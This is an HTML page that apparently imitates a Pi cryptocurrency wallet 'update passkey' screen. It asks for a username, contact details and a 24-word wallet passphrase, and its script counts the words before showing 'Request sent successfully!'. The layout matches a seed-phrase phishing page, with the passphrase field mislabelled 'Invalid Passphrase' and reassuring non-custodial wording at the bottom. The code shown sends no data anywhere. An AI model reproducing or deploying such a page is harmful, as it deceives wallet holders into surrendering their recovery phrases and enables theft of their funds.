<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unlock Pi Wallet</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f8f8f8;
            text-align: center;
        }
        .header {
            background-color: #6A329F;
            color: white;
            padding: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .header img {
            height: 30px;
        }
        .header span {
            font-size: 18px;
        }
        .container {
            margin: 40px auto;
            width: 90%;
            max-width: 400px;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
        }
        input, textarea {
            width: calc(100% - 20px);
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
            margin-bottom: 10px;
        }
        input {
            height: 40px;
        }
        textarea {
            height: 120px;
            resize: none;
        }
        .btn {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            background-color: #6A329F;
            color: white;
            border: none;
            border-radius: 5px;
            margin-top: 10px;
            cursor: pointer;
        }
        .btn-disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        .info {
            font-size: 14px;
            color: gray;
            margin-top: 20px;
        }
        @media (max-width: 600px) {
            .header {
                padding: 10px;
            }
            .header span {
                font-size: 16px;
            }
            .container {
                width: 95%;
                padding: 15px;
            }
            input, textarea {
                font-size: 14px;
                padding: 8px;
            }
            .btn {
                font-size: 14px;
                padding: 12px;
            }
            .info {
                font-size: 12px;
            }
        }
    </style>
    <script>
        function validatePassphrase() {
            var passphrase = document.getElementById("passphrase").value.trim();
            var words = passphrase.split(/\s+/).filter(word => word.length > 0);
            if (words.length !== 24) {
                alert("Passphrase must contain exactly 24 words.");
                return false;
            }
            alert("Request sent successfully!");
            return true;
        }
    </script>
</head>
<body>
    <div class="header">
        <span>Wallet</span>
    </div>
    <div class="container">
        <h2>Request to update passkey</h2>
        <input type="text" placeholder="Enter username">
        <input type="text" placeholder="Enter phone number/email ID">
        <textarea id="passphrase" placeholder="Invalid Passphrase"></textarea>
        <button class="btn" onclick="validatePassphrase()">Send Request</button>
        <p class="info">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
    </div>
</body>
</html>
